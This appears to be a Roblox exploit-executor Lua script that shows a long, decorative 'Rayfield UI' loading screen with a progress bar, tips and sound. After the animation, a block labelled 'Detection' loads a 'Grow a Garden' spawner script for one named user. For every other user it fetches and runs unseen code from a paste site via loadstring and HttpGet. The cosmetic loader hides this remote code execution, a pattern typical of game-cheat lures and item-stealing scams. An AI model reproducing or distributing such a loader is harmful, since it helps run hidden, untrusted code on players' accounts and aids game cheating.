local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

local player = Players.LocalPlayer

-- UI & Blur
local blur = Instance.new("BlurEffect", Lighting)
blur.Size = 25

local screenGui = Instance.new("ScreenGui", game.CoreGui)
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Name = "RayfieldLoader"

-- Black Background
local bg = Instance.new("Frame", screenGui)
bg.Size = UDim2.fromScale(1, 1)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.BorderSizePixel = 0

-- Shine Effect
local shine = Instance.new("UIGradient", bg)
shine.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0,0,0)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(30,30,30)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0,0,0)),
}
shine.Rotation = 45

-- Title
local title = Instance.new("TextLabel", bg)
title.Text = "🌿LOADING RAYFIELD UI🚀"
title.Font = Enum.Font.GothamBlack
title.TextSize = 32
title.TextColor3 = Color3.new(1,1,1)
title.BackgroundTransparency = 1
title.Position = UDim2.new(0.5, 0, 0.2, 0)
title.AnchorPoint = Vector2.new(0.5, 0)
title.Size = UDim2.new(0, 400, 0, 50)

-- Loading Bar Frame
local barBack = Instance.new("Frame", bg)
barBack.Size = UDim2.new(0, 300, 0, 20)
barBack.Position = UDim2.new(0.5, 0, 0.4, 0)
barBack.AnchorPoint = Vector2.new(0.5, 0.5)
barBack.BackgroundColor3 = Color3.new(1,1,1)
barBack.BorderSizePixel = 0
barBack.BackgroundTransparency = 0.2
barBack.ClipsDescendants = true

local barCorner = Instance.new("UICorner", barBack)
barCorner.CornerRadius = UDim.new(1,0)

local barFill = Instance.new("Frame", barBack)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0

local barFillCorner = Instance.new("UICorner", barFill)
barFillCorner.CornerRadius = UDim.new(1,0)

-- Percentage Text
local percentLabel = Instance.new("TextLabel", barBack)
percentLabel.Size = UDim2.new(1,0,1,0)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.fromRGB(160,160,160)
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextScaled = true

-- Tips
local tipText = Instance.new("TextLabel", bg)
tipText.Position = UDim2.new(0.5, 0, 0.45, 10)
tipText.AnchorPoint = Vector2.new(0.5, 0)
tipText.Size = UDim2.new(0, 300, 0, 20)
tipText.Text = ""
tipText.TextColor3 = Color3.fromRGB(180,180,180)
tipText.TextTransparency = 1
tipText.BackgroundTransparency = 1
tipText.Font = Enum.Font.Gotham
tipText.TextSize = 14

local tips = {
	"stuck at loading bar?, reexecute",
	"MAKE SURE YOU'RE ON PUBLIC SERVER",
	"RAYFIELD UI NO 1",
	"Tysm for using this loader!"
}

local function cycleTips()
	while true do
		for _, tip in ipairs(tips) do
			tipText.Text = tip
			TweenService:Create(tipText, TweenInfo.new(1), {TextTransparency = 0}):Play()
			wait(3)
			TweenService:Create(tipText, TweenInfo.new(1), {TextTransparency = 1}):Play()
			wait(1)
		end
	end
end

task.spawn(cycleTips)

-- Optional sound
local sound = Instance.new("Sound", bg)
sound.SoundId = "rbxassetid://9127403075" -- calming loading sound
sound.Volume = 1
sound.Looped = true
sound:Play()

-- Smooth Loading
for i = 1, 100 do
	local percent = i / 100
	percentLabel.Text = tostring(i) .. "%"
	TweenService:Create(barFill, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {
		Size = UDim2.new(percent, 0, 1, 0)
	}):Play()
	wait(0.3)
end

-- Morph to rectangle w/ "UI Loaded!"
local morph = Instance.new("Frame", bg)
morph.Size = UDim2.new(0, 300, 0, 50)
morph.Position = UDim2.new(0.5, 0, 0.5, 0)
morph.AnchorPoint = Vector2.new(0.5, 0.5)
morph.BackgroundColor3 = Color3.fromRGB(40, 200, 100)
morph.ZIndex = 10

local morphCorner = Instance.new("UICorner", morph)
morphCorner.CornerRadius = UDim.new(1, 0)

local morphText = Instance.new("TextLabel", morph)
morphText.Text = "UI Loaded!"
morphText.BackgroundTransparency = 1
morphText.TextColor3 = Color3.new(1,1,1)
morphText.Size = UDim2.new(1,0,1,0)
morphText.Font = Enum.Font.GothamBlack
morphText.TextScaled = true

-- Hide old
barBack.Visible = false
title.Visible = false
percentLabel.Visible = false

wait(1)

-- Morph to circle ✅
TweenService:Create(morph, TweenInfo.new(1), {
	Size = UDim2.new(0, 80, 0, 80)
}):Play()

morphText.Text = "✅"

wait(1.5)

-- Fade out
TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
TweenService:Create(morph, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
TweenService:Create(morphText, TweenInfo.new(1), {TextTransparency = 1}):Play()
TweenService:Create(blur, TweenInfo.new(1), {Size = 0}):Play()

wait(1.5)
screenGui:Destroy()
blur:Destroy()

-- Detection
if player.Name == "DYLANcuriae25" then
    loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
    Spawner.Load()
else
    loadstring(game:HttpGet("https://pastefy.app/aQd7MJ0E/raw"))()
end
